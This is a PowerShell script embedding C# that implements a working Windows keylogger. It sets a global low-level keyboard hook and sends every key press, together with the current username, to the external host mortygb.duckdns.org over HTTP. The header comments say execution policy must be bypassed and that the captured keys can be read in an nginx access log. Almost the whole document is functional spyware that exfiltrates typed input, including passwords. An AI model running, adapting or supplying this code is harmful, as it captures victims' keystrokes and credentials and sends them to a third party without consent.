# Source: https://hinchley.net/articles/creating-a-key-logger-via-a-global-system-hook-using-powershell
# Must have -SetExecutionPolicy bypass or RemoteSigned to run
# Basic keylogger, continuously sends key-presses to "mortygb.duckdns.org/<keypress>"
# See output on nginx-machine (/var/log/nginx/access.log)

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Windows.Forms;

namespace KeyLogger {
    public static class Program {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;

        private static string apiUrl = "http://mortygb.duckdns.org/";

        public static void Main() {
            hookId = SetHook(hookProc);
            Application.Run();
            UnhookWindowsHookEx(hookId);
        }

        private static IntPtr SetHook(HookProc hookProc) {
            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;
                string username = Environment.UserName;

                // Send the keypress and username to the specified URL
                SendKeyPressToApi(username, key.ToString());
            }

            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private static void SendKeyPressToApi(string username, string key) {
            try {
                using (WebClient client = new WebClient()) {
                    // Construct the URL with the keypress and username
                    string url = apiUrl + "?user=" + username + "&key=" + key;

                    // Make a simple GET request to the URL
                    client.DownloadString(url);
                }
            } catch (Exception ex) {
                // Handle any exceptions that may occur during the request
                Console.WriteLine("Error sending keypress to API: " + ex.Message);
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Main();
